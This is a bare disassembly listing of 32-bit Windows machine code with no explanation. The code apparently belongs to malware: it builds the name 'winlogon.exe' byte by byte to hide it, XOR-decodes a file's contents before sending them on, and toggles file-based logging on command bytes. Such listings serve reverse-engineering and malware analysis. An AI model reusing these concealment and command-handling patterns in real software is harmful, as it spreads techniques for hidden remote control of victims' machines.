  4058f1:	eb 43                	jmp    0x405936
  4058f3:	8b 46 04             	mov    0x4(%esi),%eax
  4058f6:	6a 01                	push   $0x1
  4058f8:	6a 00                	push   $0x0
  4058fa:	6a 00                	push   $0x0
  4058fc:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  405902:	51                   	push   %ecx
  405903:	68 c0 4b 40 00       	push   $0x404bc0
  405908:	eb 2c                	jmp    0x405936
  40590a:	8b 46 04             	mov    0x4(%esi),%eax
  40590d:	6a 00                	push   $0x0
  40590f:	6a 00                	push   $0x0
  405911:	6a 00                	push   $0x0
  405913:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  405919:	51                   	push   %ecx
  40591a:	68 40 4f 40 00       	push   $0x404f40
  40591f:	eb 15                	jmp    0x405936
  405921:	8b 46 04             	mov    0x4(%esi),%eax
  405924:	6a 00                	push   $0x0
  405926:	6a 00                	push   $0x0
  405928:	6a 00                	push   $0x0
  40592a:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  405930:	51                   	push   %ecx
  405931:	68 20 50 40 00       	push   $0x405020
  405936:	6a 00                	push   $0x0
  405938:	6a 00                	push   $0x0
  40593a:	e8 31 3c 00 00       	call   0x409570
  40593f:	8b 96 50 9e 00 00    	mov    0x9e50(%esi),%edx
  405945:	83 c4 1c             	add    $0x1c,%esp
  405948:	89 84 96 10 02 00 00 	mov    %eax,0x210(%esi,%edx,4)
  40594f:	8b 86 50 9e 00 00    	mov    0x9e50(%esi),%eax
  405955:	40                   	inc    %eax
  405956:	89 86 50 9e 00 00    	mov    %eax,0x9e50(%esi)
  40595c:	5e                   	pop    %esi
  40595d:	c2 08 00             	ret    $0x8
  405960:	6a 01                	push   $0x1
  405962:	6a 00                	push   $0x0
  405964:	40                   	inc    %eax
  405965:	6a 00                	push   $0x0
  405967:	50                   	push   %eax
  405968:	68 00 51 40 00       	push   $0x405100
  40596d:	6a 00                	push   $0x0
  40596f:	6a 00                	push   $0x0
  405971:	e8 fa 3b 00 00       	call   0x409570
  405976:	8b 8e 50 9e 00 00    	mov    0x9e50(%esi),%ecx
  40597c:	83 c4 1c             	add    $0x1c,%esp
  40597f:	89 84 8e 10 02 00 00 	mov    %eax,0x210(%esi,%ecx,4)
  405986:	8b 8e 50 9e 00 00    	mov    0x9e50(%esi),%ecx
  40598c:	41                   	inc    %ecx
  40598d:	6a 64                	push   $0x64
  40598f:	89 8e 50 9e 00 00    	mov    %ecx,0x9e50(%esi)
  405995:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  40599b:	5e                   	pop    %esi
  40599c:	c2 08 00             	ret    $0x8
  40599f:	40                   	inc    %eax
  4059a0:	6a 01                	push   $0x1
  4059a2:	50                   	push   %eax
  4059a3:	e8 a8 f8 ff ff       	call   0x405250
  4059a8:	83 c4 08             	add    $0x8,%esp
  4059ab:	5e                   	pop    %esi
  4059ac:	c2 08 00             	ret    $0x8
  4059af:	40                   	inc    %eax
  4059b0:	6a 00                	push   $0x0
  4059b2:	50                   	push   %eax
  4059b3:	e8 98 f8 ff ff       	call   0x405250
  4059b8:	83 c4 08             	add    $0x8,%esp
  4059bb:	5e                   	pop    %esi
  4059bc:	c2 08 00             	ret    $0x8
  4059bf:	e8 8c f9 ff ff       	call   0x405350
  4059c4:	5e                   	pop    %esi
  4059c5:	c2 08 00             	ret    $0x8
  4059c8:	33 d2                	xor    %edx,%edx
  4059ca:	8a 50 01             	mov    0x1(%eax),%dl
  4059cd:	52                   	push   %edx
  4059ce:	e8 ed 39 00 00       	call   0x4093c0
  4059d3:	83 c4 04             	add    $0x4,%esp
  4059d6:	5e                   	pop    %esi
  4059d7:	c2 08 00             	ret    $0x8
  4059da:	40                   	inc    %eax
  4059db:	83 c6 10             	add    $0x10,%esi
  4059de:	50                   	push   %eax
  4059df:	56                   	push   %esi
  4059e0:	e8 db f9 ff ff       	call   0x4053c0
  4059e5:	83 c4 08             	add    $0x8,%esp
  4059e8:	5e                   	pop    %esi
  4059e9:	c2 08 00             	ret    $0x8
  4059ec:	40                   	inc    %eax
  4059ed:	50                   	push   %eax
  4059ee:	e8 cd f7 ff ff       	call   0x4051c0
  4059f3:	83 c4 04             	add    $0x4,%esp
  4059f6:	84 c0                	test   %al,%al
  4059f8:	74 07                	je     0x405a01
  4059fa:	8b ce                	mov    %esi,%ecx
  4059fc:	e8 7f 00 00 00       	call   0x405a80
  405a01:	5e                   	pop    %esi
  405a02:	c2 08 00             	ret    $0x8
  405a05:	8d 49 00             	lea    0x0(%ecx),%ecx
  405a08:	94                   	xchg   %eax,%esp
  405a09:	58                   	pop    %eax
  405a0a:	40                   	inc    %eax
  405a0b:	00 ae 58 40 00 c5    	add    %ch,-0x3affbfa8(%esi)
  405a11:	58                   	pop    %eax
  405a12:	40                   	inc    %eax
  405a13:	00 0a                	add    %cl,(%edx)
  405a15:	59                   	pop    %ecx
  405a16:	40                   	inc    %eax
  405a17:	00 dc                	add    %bl,%ah
  405a19:	58                   	pop    %eax
  405a1a:	40                   	inc    %eax
  405a1b:	00 21                	add    %ah,(%ecx)
  405a1d:	59                   	pop    %ecx
  405a1e:	40                   	inc    %eax
  405a1f:	00 f3                	add    %dh,%bl
  405a21:	58                   	pop    %eax
  405a22:	40                   	inc    %eax
  405a23:	00 c8                	add    %cl,%al
  405a25:	59                   	pop    %ecx
  405a26:	40                   	inc    %eax
  405a27:	00 fa                	add    %bh,%dl
  405a29:	59                   	pop    %ecx
  405a2a:	40                   	inc    %eax
  405a2b:	00 60 59             	add    %ah,0x59(%eax)
  405a2e:	40                   	inc    %eax
  405a2f:	00 ec                	add    %ch,%ah
  405a31:	59                   	pop    %ecx
  405a32:	40                   	inc    %eax
  405a33:	00 bf 59 40 00 af    	add    %bh,-0x50ffbfa7(%edi)
  405a39:	59                   	pop    %ecx
  405a3a:	40                   	inc    %eax
  405a3b:	00 9f 59 40 00 da    	add    %bl,-0x25ffbfa7(%edi)
  405a41:	59                   	pop    %ecx
  405a42:	40                   	inc    %eax
  405a43:	00 01                	add    %al,(%ecx)
  405a45:	5a                   	pop    %edx
  405a46:	40                   	inc    %eax
  405a47:	00 00                	add    %al,(%eax)
  405a49:	0f                   	(bad)
  405a4a:	0f                   	(bad)
  405a4b:	0f                   	(bad)
  405a4c:	0f                   	(bad)
  405a4d:	0f                   	(bad)
  405a4e:	0f                   	(bad)
  405a4f:	0f                   	(bad)
  405a50:	0f                   	(bad)
  405a51:	0f                   	(bad)
  405a52:	0f                   	(bad)
  405a53:	0f                   	(bad)
  405a54:	0f                   	(bad)
  405a55:	0f                   	(bad)
  405a56:	0f 01 0f             	sidtl  (%edi)
  405a59:	0f                   	(bad)
  405a5a:	0f                   	(bad)
  405a5b:	0f                   	(bad)
  405a5c:	0f                   	(bad)
  405a5d:	0f                   	(bad)
  405a5e:	0f                   	(bad)
  405a5f:	0f                   	(bad)
  405a60:	0f 02 0f             	lar    (%edi),%ecx
  405a63:	0f                   	(bad)
  405a64:	0f                   	(bad)
  405a65:	0f 03 0f             	lsl    (%edi),%ecx
  405a68:	0f 04                	(bad)
  405a6a:	05 0f 0f 0f 0f       	add    $0xf0f0f0f,%eax
  405a6f:	06                   	push   %es
  405a70:	07                   	pop    %es
  405a71:	08 09                	or     %cl,(%ecx)
  405a73:	0a 0b                	or     (%ebx),%cl
  405a75:	0c 0d                	or     $0xd,%al
  405a77:	0e                   	push   %cs
  405a78:	90                   	nop
  405a79:	90                   	nop
  405a7a:	90                   	nop
  405a7b:	90                   	nop
  405a7c:	90                   	nop
  405a7d:	90                   	nop
  405a7e:	90                   	nop
  405a7f:	90                   	nop
  405a80:	81 ec 2c 03 00 00    	sub    $0x32c,%esp
  405a86:	a1 40 e8 40 00       	mov    0x40e840,%eax
  405a8b:	56                   	push   %esi
  405a8c:	57                   	push   %edi
  405a8d:	68 74 e3 40 00       	push   $0x40e374
  405a92:	8b f9                	mov    %ecx,%edi
  405a94:	50                   	push   %eax
  405a95:	e8 76 ef ff ff       	call   0x404a10
  405a9a:	83 c4 08             	add    $0x8,%esp
  405a9d:	8b f0                	mov    %eax,%esi
  405a9f:	8d 8c 24 30 02 00 00 	lea    0x230(%esp),%ecx
  405aa6:	83 c6 06             	add    $0x6,%esi
  405aa9:	68 04 01 00 00       	push   $0x104
  405aae:	51                   	push   %ecx
  405aaf:	56                   	push   %esi
  405ab0:	ff 15 78 b1 40 00    	call   *0x40b178
  405ab6:	56                   	push   %esi
  405ab7:	e8 2a 4c 00 00       	call   0x40a6e6
  405abc:	83 c4 04             	add    $0x4,%esp
  405abf:	8d 54 24 18          	lea    0x18(%esp),%edx
  405ac3:	52                   	push   %edx
  405ac4:	ff 15 74 b1 40 00    	call   *0x40b174
  405aca:	8b 44 24 24          	mov    0x24(%esp),%eax
  405ace:	8b 4c 24 22          	mov    0x22(%esp),%ecx
  405ad2:	8b 54 24 20          	mov    0x20(%esp),%edx
  405ad6:	25 ff ff 00 00       	and    $0xffff,%eax
  405adb:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  405ae1:	50                   	push   %eax
  405ae2:	8b 44 24 22          	mov    0x22(%esp),%eax
  405ae6:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  405aec:	51                   	push   %ecx
  405aed:	8b 4c 24 22          	mov    0x22(%esp),%ecx
  405af1:	52                   	push   %edx
  405af2:	8b 54 24 24          	mov    0x24(%esp),%edx
  405af6:	25 ff ff 00 00       	and    $0xffff,%eax
  405afb:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  405b01:	50                   	push   %eax
  405b02:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  405b08:	51                   	push   %ecx
  405b09:	52                   	push   %edx
  405b0a:	8d 44 24 40          	lea    0x40(%esp),%eax
  405b0e:	68 60 e3 40 00       	push   $0x40e360
  405b13:	50                   	push   %eax
  405b14:	ff 15 78 b3 40 00    	call   *0x40b378
  405b1a:	83 c4 20             	add    $0x20,%esp
  405b1d:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  405b21:	8d 94 24 30 02 00 00 	lea    0x230(%esp),%edx
  405b28:	51                   	push   %ecx
  405b29:	52                   	push   %edx
  405b2a:	ff 15 50 b1 40 00    	call   *0x40b150
  405b30:	6a 04                	push   $0x4
  405b32:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  405b36:	6a 00                	push   $0x0
  405b38:	50                   	push   %eax
  405b39:	ff 15 70 b1 40 00    	call   *0x40b170
  405b3f:	8d 8c 24 2c 01 00 00 	lea    0x12c(%esp),%ecx
  405b46:	68 04 01 00 00       	push   $0x104
  405b4b:	51                   	push   %ecx
  405b4c:	ff 15 f4 b1 40 00    	call   *0x40b1f4
  405b52:	8d 94 24 2c 01 00 00 	lea    0x12c(%esp),%edx
  405b59:	68 54 e3 40 00       	push   $0x40e354
  405b5e:	52                   	push   %edx
  405b5f:	ff 15 d0 b0 40 00    	call   *0x40b0d0
  405b65:	8d 84 24 2c 01 00 00 	lea    0x12c(%esp),%eax
  405b6c:	50                   	push   %eax
  405b6d:	ff 15 fc b0 40 00    	call   *0x40b0fc
  405b73:	b0 6f                	mov    $0x6f,%al
  405b75:	b1 6e                	mov    $0x6e,%cl
  405b77:	88 44 24 0c          	mov    %al,0xc(%esp)
  405b7b:	88 44 24 0e          	mov    %al,0xe(%esp)
  405b7f:	b0 65                	mov    $0x65,%al
  405b81:	c6 44 24 08 77       	movb   $0x77,0x8(%esp)
  405b86:	c6 44 24 09 69       	movb   $0x69,0x9(%esp)
  405b8b:	88 4c 24 0a          	mov    %cl,0xa(%esp)
  405b8f:	c6 44 24 0b 6c       	movb   $0x6c,0xb(%esp)
  405b94:	c6 44 24 0d 67       	movb   $0x67,0xd(%esp)
  405b99:	88 4c 24 0f          	mov    %cl,0xf(%esp)
  405b9d:	c6 44 24 10 2e       	movb   $0x2e,0x10(%esp)
  405ba2:	88 44 24 11          	mov    %al,0x11(%esp)
  405ba6:	c6 44 24 12 78       	movb   $0x78,0x12(%esp)
  405bab:	88 44 24 13          	mov    %al,0x13(%esp)
  405baf:	c6 44 24 14 00       	movb   $0x0,0x14(%esp)
  405bb4:	81 bf 54 9e 00 00 20 	cmpl   $0x120,0x9e54(%edi)
  405bbb:	01 00 00 
  405bbe:	74 13                	je     0x405bd3
  405bc0:	8d 4f 10             	lea    0x10(%edi),%ecx
  405bc3:	8d 54 24 08          	lea    0x8(%esp),%edx
  405bc7:	51                   	push   %ecx
  405bc8:	52                   	push   %edx
  405bc9:	e8 c2 f9 ff ff       	call   0x405590
  405bce:	83 c4 08             	add    $0x8,%esp
  405bd1:	eb 0c                	jmp    0x405bdf
  405bd3:	8d 47 10             	lea    0x10(%edi),%eax
  405bd6:	50                   	push   %eax
  405bd7:	e8 a4 ec ff ff       	call   0x404880
  405bdc:	83 c4 04             	add    $0x4,%esp
  405bdf:	81 c7 10 01 00 00    	add    $0x110,%edi
  405be5:	57                   	push   %edi
  405be6:	6a 00                	push   $0x0
  405be8:	6a 01                	push   $0x1
  405bea:	6a 00                	push   $0x0
  405bec:	ff 15 e8 b1 40 00    	call   *0x40b1e8
  405bf2:	5f                   	pop    %edi
  405bf3:	5e                   	pop    %esi
  405bf4:	81 c4 2c 03 00 00    	add    $0x32c,%esp
  405bfa:	c3                   	ret
  405bfb:	90                   	nop
  405bfc:	90                   	nop
  405bfd:	90                   	nop
  405bfe:	90                   	nop
  405bff:	90                   	nop
  405c00:	e9 0b 00 00 00       	jmp    0x405c10
  405c05:	90                   	nop
  405c06:	90                   	nop
  405c07:	90                   	nop
  405c08:	90                   	nop
  405c09:	90                   	nop
  405c0a:	90                   	nop
  405c0b:	90                   	nop
  405c0c:	90                   	nop
  405c0d:	90                   	nop
  405c0e:	90                   	nop
  405c0f:	90                   	nop
  405c10:	ff 15 7c b1 40 00    	call   *0x40b17c
  405c16:	a3 30 e8 40 00       	mov    %eax,0x40e830
  405c1b:	c3                   	ret
  405c1c:	90                   	nop
  405c1d:	90                   	nop
  405c1e:	90                   	nop
  405c1f:	90                   	nop
  405c20:	6a ff                	push   $0xffffffff
  405c22:	68 18 ac 40 00       	push   $0x40ac18
  405c27:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405c2d:	50                   	push   %eax
  405c2e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405c35:	51                   	push   %ecx
  405c36:	8b 44 24 14          	mov    0x14(%esp),%eax
  405c3a:	56                   	push   %esi
  405c3b:	57                   	push   %edi
  405c3c:	8b f9                	mov    %ecx,%edi
  405c3e:	50                   	push   %eax
  405c3f:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  405c43:	e8 d8 02 00 00       	call   0x405f20
  405c48:	c7 07 9c b4 40 00    	movl   $0x40b49c,(%edi)
  405c4e:	8b cf                	mov    %edi,%ecx
  405c50:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405c57:	00 
  405c58:	c6 05 34 e8 40 00 01 	movb   $0x1,0x40e834
  405c5f:	e8 7c 01 00 00       	call   0x405de0
  405c64:	8b cf                	mov    %edi,%ecx
  405c66:	e8 a5 03 00 00       	call   0x406010
  405c6b:	8b cf                	mov    %edi,%ecx
  405c6d:	e8 ee 01 00 00       	call   0x405e60
  405c72:	8b 0d 38 e8 40 00    	mov    0x40e838,%ecx
  405c78:	8b 31                	mov    (%ecx),%esi
  405c7a:	8b 4f 04             	mov    0x4(%edi),%ecx
  405c7d:	e8 ae c2 ff ff       	call   0x401f30
  405c82:	84 c0                	test   %al,%al
  405c84:	74 42                	je     0x405cc8
  405c86:	55                   	push   %ebp
  405c87:	8b 2d c4 b0 40 00    	mov    0x40b0c4,%ebp
  405c8d:	8b 0d 38 e8 40 00    	mov    0x40e838,%ecx
  405c93:	8b 01                	mov    (%ecx),%eax
  405c95:	3b c6                	cmp    %esi,%eax
  405c97:	74 1b                	je     0x405cb4
  405c99:	72 02                	jb     0x405c9d
  405c9b:	2b c6                	sub    %esi,%eax
  405c9d:	8d 94 31 11 01 00 00 	lea    0x111(%ecx,%esi,1),%edx
  405ca4:	50                   	push   %eax
  405ca5:	52                   	push   %edx
  405ca6:	8b cf                	mov    %edi,%ecx
  405ca8:	e8 53 01 00 00       	call   0x405e00
  405cad:	a1 38 e8 40 00       	mov    0x40e838,%eax
  405cb2:	8b 30                	mov    (%eax),%esi
  405cb4:	68 2c 01 00 00       	push   $0x12c
  405cb9:	ff d5                	call   *%ebp
  405cbb:	8b 4f 04             	mov    0x4(%edi),%ecx
  405cbe:	e8 6d c2 ff ff       	call   0x401f30
  405cc3:	84 c0                	test   %al,%al
  405cc5:	75 c6                	jne    0x405c8d
  405cc7:	5d                   	pop    %ebp
  405cc8:	8b 0d 38 e8 40 00    	mov    0x40e838,%ecx
  405cce:	8a 41 0c             	mov    0xc(%ecx),%al
  405cd1:	84 c0                	test   %al,%al
  405cd3:	75 07                	jne    0x405cdc
  405cd5:	c6 05 34 e8 40 00 00 	movb   $0x0,0x40e834
  405cdc:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405ce0:	8b c7                	mov    %edi,%eax
  405ce2:	5f                   	pop    %edi
  405ce3:	5e                   	pop    %esi
  405ce4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405ceb:	83 c4 10             	add    $0x10,%esp
  405cee:	c2 04 00             	ret    $0x4
  405cf1:	90                   	nop
  405cf2:	90                   	nop
  405cf3:	90                   	nop
  405cf4:	90                   	nop
  405cf5:	90                   	nop
  405cf6:	90                   	nop
  405cf7:	90                   	nop
  405cf8:	90                   	nop
  405cf9:	90                   	nop
  405cfa:	90                   	nop
  405cfb:	90                   	nop
  405cfc:	90                   	nop
  405cfd:	90                   	nop
  405cfe:	90                   	nop
  405cff:	90                   	nop
  405d00:	56                   	push   %esi
  405d01:	8b f1                	mov    %ecx,%esi
  405d03:	e8 18 00 00 00       	call   0x405d20
  405d08:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  405d0d:	74 09                	je     0x405d18
  405d0f:	56                   	push   %esi
  405d10:	e8 d1 49 00 00       	call   0x40a6e6
  405d15:	83 c4 04             	add    $0x4,%esp
  405d18:	8b c6                	mov    %esi,%eax
  405d1a:	5e                   	pop    %esi
  405d1b:	c2 04 00             	ret    $0x4
  405d1e:	90                   	nop
  405d1f:	90                   	nop
  405d20:	c7 01 9c b4 40 00    	movl   $0x40b49c,(%ecx)
  405d26:	e9 45 02 00 00       	jmp    0x405f70
  405d2b:	90                   	nop
  405d2c:	90                   	nop
  405d2d:	90                   	nop
  405d2e:	90                   	nop
  405d2f:	90                   	nop
  405d30:	53                   	push   %ebx
  405d31:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  405d35:	56                   	push   %esi
  405d36:	57                   	push   %edi
  405d37:	80 3b 1e             	cmpb   $0x1e,(%ebx)
  405d3a:	75 05                	jne    0x405d41
  405d3c:	e8 ef 02 00 00       	call   0x406030
  405d41:	8a 03                	mov    (%ebx),%al
  405d43:	8b 35 40 b1 40 00    	mov    0x40b140,%esi
  405d49:	8b 3d e4 b1 40 00    	mov    0x40b1e4,%edi
  405d4f:	3c 20                	cmp    $0x20,%al
  405d51:	75 58                	jne    0x405dab
  405d53:	a1 38 e8 40 00       	mov    0x40e838,%eax
  405d58:	8a 50 0c             	mov    0xc(%eax),%dl
  405d5b:	84 d2                	test   %dl,%dl
  405d5d:	0f 94 c1             	sete   %cl
  405d60:	88 48 0c             	mov    %cl,0xc(%eax)
  405d63:	a1 38 e8 40 00       	mov    0x40e838,%eax
  405d68:	8a 48 0c             	mov    0xc(%eax),%cl
  405d6b:	84 c9                	test   %cl,%cl
  405d6d:	75 0c                	jne    0x405d7b
  405d6f:	83 c0 0d             	add    $0xd,%eax
  405d72:	50                   	push   %eax
  405d73:	ff 15 fc b0 40 00    	call   *0x40b0fc
  405d79:	eb 30                	jmp    0x405dab
  405d7b:	83 c0 0d             	add    $0xd,%eax
  405d7e:	50                   	push   %eax
  405d7f:	ff 15 08 b1 40 00    	call   *0x40b108
  405d85:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d88:	75 21                	jne    0x405dab
  405d8a:	8b 15 38 e8 40 00    	mov    0x40e838,%edx
  405d90:	6a 00                	push   $0x0
  405d92:	68 80 00 00 00       	push   $0x80
  405d97:	6a 02                	push   $0x2
  405d99:	6a 00                	push   $0x0
  405d9b:	6a 02                	push   $0x2
  405d9d:	83 c2 0d             	add    $0xd,%edx
  405da0:	68 00 00 00 40       	push   $0x40000000
  405da5:	52                   	push   %edx
  405da6:	ff d6                	call   *%esi
  405da8:	50                   	push   %eax
  405da9:	ff d7                	call   *%edi
  405dab:	80 3b 21             	cmpb   $0x21,(%ebx)
  405dae:	75 27                	jne    0x405dd7
  405db0:	a1 38 e8 40 00       	mov    0x40e838,%eax
  405db5:	8a 48 0c             	mov    0xc(%eax),%cl
  405db8:	84 c9                	test   %cl,%cl
  405dba:	74 1b                	je     0x405dd7
  405dbc:	6a 00                	push   $0x0
  405dbe:	68 80 00 00 00       	push   $0x80
  405dc3:	6a 02                	push   $0x2
  405dc5:	6a 00                	push   $0x0
  405dc7:	6a 02                	push   $0x2
  405dc9:	83 c0 0d             	add    $0xd,%eax
  405dcc:	68 00 00 00 40       	push   $0x40000000
  405dd1:	50                   	push   %eax
  405dd2:	ff d6                	call   *%esi
  405dd4:	50                   	push   %eax
  405dd5:	ff d7                	call   *%edi
  405dd7:	5f                   	pop    %edi
  405dd8:	5e                   	pop    %esi
  405dd9:	5b                   	pop    %ebx
  405dda:	c2 08 00             	ret    $0x8
  405ddd:	90                   	nop
  405dde:	90                   	nop
  405ddf:	90                   	nop
  405de0:	51                   	push   %ecx
  405de1:	a1 38 e8 40 00       	mov    0x40e838,%eax
  405de6:	c6 44 24 02 7b       	movb   $0x7b,0x2(%esp)
  405deb:	6a 02                	push   $0x2
  405ded:	8a 50 0c             	mov    0xc(%eax),%dl
  405df0:	8d 44 24 06          	lea    0x6(%esp),%eax
  405df4:	50                   	push   %eax
  405df5:	88 54 24 0b          	mov    %dl,0xb(%esp)
  405df9:	e8 a2 01 00 00       	call   0x405fa0
  405dfe:	59                   	pop    %ecx
  405dff:	c3                   	ret
  405e00:	51                   	push   %ecx
  405e01:	53                   	push   %ebx
  405e02:	55                   	push   %ebp
  405e03:	56                   	push   %esi
  405e04:	8b 74 24 18          	mov    0x18(%esp),%esi
  405e08:	57                   	push   %edi
  405e09:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  405e0d:	8d 6e 01             	lea    0x1(%esi),%ebp
  405e10:	55                   	push   %ebp
  405e11:	6a 40                	push   $0x40
  405e13:	ff 15 34 b1 40 00    	call   *0x40b134
  405e19:	8b ce                	mov    %esi,%ecx
  405e1b:	8b 74 24 18          	mov    0x18(%esp),%esi
  405e1f:	8b d8                	mov    %eax,%ebx
  405e21:	8b c1                	mov    %ecx,%eax
  405e23:	c1 e9 02             	shr    $0x2,%ecx
  405e26:	8d 7b 01             	lea    0x1(%ebx),%edi
  405e29:	c6 03 7c             	movb   $0x7c,(%ebx)
  405e2c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405e2e:	8b c8                	mov    %eax,%ecx
  405e30:	55                   	push   %ebp
  405e31:	83 e1 03             	and    $0x3,%ecx
  405e34:	53                   	push   %ebx
  405e35:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405e37:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405e3b:	e8 60 01 00 00       	call   0x405fa0
  405e40:	53                   	push   %ebx
  405e41:	8b f0                	mov    %eax,%esi
  405e43:	ff 15 24 b1 40 00    	call   *0x40b124
  405e49:	8b c6                	mov    %esi,%eax
  405e4b:	5f                   	pop    %edi
  405e4c:	5e                   	pop    %esi
  405e4d:	5d                   	pop    %ebp
  405e4e:	5b                   	pop    %ebx
  405e4f:	59                   	pop    %ecx
  405e50:	c2 08 00             	ret    $0x8
  405e53:	90                   	nop
  405e54:	90                   	nop
  405e55:	90                   	nop
  405e56:	90                   	nop
  405e57:	90                   	nop
  405e58:	90                   	nop
  405e59:	90                   	nop
  405e5a:	90                   	nop
  405e5b:	90                   	nop
  405e5c:	90                   	nop
  405e5d:	90                   	nop
  405e5e:	90                   	nop
  405e5f:	90                   	nop
  405e60:	81 ec 08 01 00 00    	sub    $0x108,%esp
  405e66:	53                   	push   %ebx
  405e67:	55                   	push   %ebp
  405e68:	57                   	push   %edi
  405e69:	8d 44 24 10          	lea    0x10(%esp),%eax
  405e6d:	33 ff                	xor    %edi,%edi
  405e6f:	68 04 01 00 00       	push   $0x104
  405e74:	8b e9                	mov    %ecx,%ebp
  405e76:	50                   	push   %eax
  405e77:	89 7c 24 14          	mov    %edi,0x14(%esp)
  405e7b:	ff 15 f4 b1 40 00    	call   *0x40b1f4
  405e81:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  405e85:	68 14 e2 40 00       	push   $0x40e214
  405e8a:	51                   	push   %ecx
  405e8b:	ff 15 d0 b0 40 00    	call   *0x40b0d0
  405e91:	57                   	push   %edi
  405e92:	68 80 00 00 00       	push   $0x80
  405e97:	6a 03                	push   $0x3
  405e99:	57                   	push   %edi
  405e9a:	6a 01                	push   $0x1
  405e9c:	8d 54 24 24          	lea    0x24(%esp),%edx
  405ea0:	68 00 00 00 80       	push   $0x80000000
  405ea5:	52                   	push   %edx
  405ea6:	ff 15 40 b1 40 00    	call   *0x40b140
  405eac:	8b d8                	mov    %eax,%ebx
  405eae:	83 fb ff             	cmp    $0xffffffff,%ebx
  405eb1:	74 4f                	je     0x405f02
  405eb3:	56                   	push   %esi
  405eb4:	57                   	push   %edi
  405eb5:	53                   	push   %ebx
  405eb6:	ff 15 3c b1 40 00    	call   *0x40b13c
  405ebc:	8b f8                	mov    %eax,%edi
  405ebe:	57                   	push   %edi
  405ebf:	e8 1c 48 00 00       	call   0x40a6e0
  405ec4:	83 c4 04             	add    $0x4,%esp
  405ec7:	8b f0                	mov    %eax,%esi
  405ec9:	8d 44 24 10          	lea    0x10(%esp),%eax
  405ecd:	6a 00                	push   $0x0
  405ecf:	50                   	push   %eax
  405ed0:	57                   	push   %edi
  405ed1:	56                   	push   %esi
  405ed2:	53                   	push   %ebx
  405ed3:	ff 15 44 b1 40 00    	call   *0x40b144
  405ed9:	33 c0                	xor    %eax,%eax
  405edb:	85 ff                	test   %edi,%edi
  405edd:	76 0e                	jbe    0x405eed
  405edf:	8a 0c 30             	mov    (%eax,%esi,1),%cl
  405ee2:	80 f1 62             	xor    $0x62,%cl
  405ee5:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  405ee8:	40                   	inc    %eax
  405ee9:	3b c7                	cmp    %edi,%eax
  405eeb:	72 f2                	jb     0x405edf
  405eed:	57                   	push   %edi
  405eee:	56                   	push   %esi
  405eef:	8b cd                	mov    %ebp,%ecx
  405ef1:	e8 0a ff ff ff       	call   0x405e00
  405ef6:	56                   	push   %esi
  405ef7:	8b f8                	mov    %eax,%edi
  405ef9:	e8 e8 47 00 00       	call   0x40a6e6
  405efe:	83 c4 04             	add    $0x4,%esp
  405f01:	5e                   	pop    %esi
  405f02:	53                   	push   %ebx
  405f03:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  405f09:	8b c7                	mov    %edi,%eax
  405f0b:	5f                   	pop    %edi
  405f0c:	5d                   	pop    %ebp
  405f0d:	5b                   	pop    %ebx
  405f0e:	81 c4 08 01 00 00    	add    $0x108,%esp
  405f14:	c3                   	ret
  405f15:	90                   	nop
  405f16:	90                   	nop
  405f17:	90                   	nop
  405f18:	90                   	nop
  405f19:	90                   	nop
  405f1a:	90                   	nop
  405f1b:	90                   	nop
  405f1c:	90                   	nop
  405f1d:	90                   	nop
  405f1e:	90                   	nop
  405f1f:	90                   	nop
  405f20:	56                   	push   %esi
  405f21:	8b f1                	mov    %ecx,%esi
  405f23:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  405f27:	56                   	push   %esi
  405f28:	c7 06 a4 b4 40 00    	movl   $0x40b4a4,(%esi)
  405f2e:	89 4e 04             	mov    %ecx,0x4(%esi)
  405f31:	e8 ca c4 ff ff       	call   0x402400
  405f36:	6a 00                	push   $0x0
  405f38:	6a 00                	push   $0x0
  405f3a:	6a 01                	push   $0x1
  405f3c:	6a 00                	push   $0x0
  405f3e:	ff 15 e8 b1 40 00    	call   *0x40b1e8
  405f44:	89 46 08             	mov    %eax,0x8(%esi)
  405f47:	8b c6                	mov    %esi,%eax
  405f49:	5e                   	pop    %esi
  405f4a:	c2 04 00             	ret    $0x4
  405f4d:	90                   	nop
  405f4e:	90                   	nop
  405f4f:	90                   	nop
  405f50:	56                   	push   %esi
  405f51:	8b f1                	mov    %ecx,%esi
  405f53:	e8 18 00 00 00       	call   0x405f70
  405f58:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  405f5d:	74 09                	je     0x405f68
  405f5f:	56                   	push   %esi
  405f60:	e8 81 47 00 00       	call   0x40a6e6
  405f65:	83 c4 04             	add    $0x4,%esp
  405f68:	8b c6                	mov    %esi,%eax
  405f6a:	5e                   	pop    %esi
  405f6b:	c2 04 00             	ret    $0x4
  405f6e:	90                   	nop
  405f6f:	90                   	nop
  405f70:	8b 41 08             	mov    0x8(%ecx),%eax
  405f73:	c7 01 a4 b4 40 00    	movl   $0x40b4a4,(%ecx)
  405f79:	50                   	push   %eax
  405f7a:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  405f80:	c3                   	ret
  405f81:	90                   	nop
  405f82:	90                   	nop
  405f83:	90                   	nop
  405f84:	90                   	nop
  405f85:	90                   	nop
  405f86:	90                   	nop
  405f87:	90                   	nop
  405f88:	90                   	nop
  405f89:	90                   	nop
